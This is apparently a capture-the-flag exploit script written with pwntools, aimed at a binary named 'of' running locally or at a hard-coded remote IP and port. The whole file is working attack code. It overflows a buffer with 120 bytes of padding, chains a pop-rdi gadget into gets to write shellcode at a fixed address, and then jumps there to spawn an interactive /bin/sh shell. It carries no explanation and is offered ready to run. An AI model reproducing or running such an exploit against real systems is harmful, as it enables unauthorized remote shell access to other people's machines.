#! /usr/bin/python

import sys
from pwn import *
from LibcSearcher import *

sl = lambda x:p.sendline(x)
sd = lambda x:p.send(x)
sda = lambda x,y:p.sendafter(x,y)
sla = lambda x,y:p.sendlineafter(x,y)
rv = lambda x:p.recv(x)
ru = lambda x:p.recvuntil(x)
ia = lambda :p.interactive()

context(os='linux', arch='amd64', log_level='debug')

if(sys.argv[1] == 'l'):
	p = process("./of")
	elf = ELF("./of")
else:
	p = remote('123.57.225.26',42435)
	elf = ELF("./of")


target = 0x601000

gets = elf.plt['gets']

main = elf.symbols['main']

pop_rdi_ret = 0x00000000004006a3

shellcode = asm(shellcraft.amd64.linux.sh())

gdb.attach(p,'b *gets')

payload = 'A' * 120 + p64(pop_rdi_ret) + p64(target) + p64(gets) + p64(target)
sl(payload)

sl(shellcode)

ia()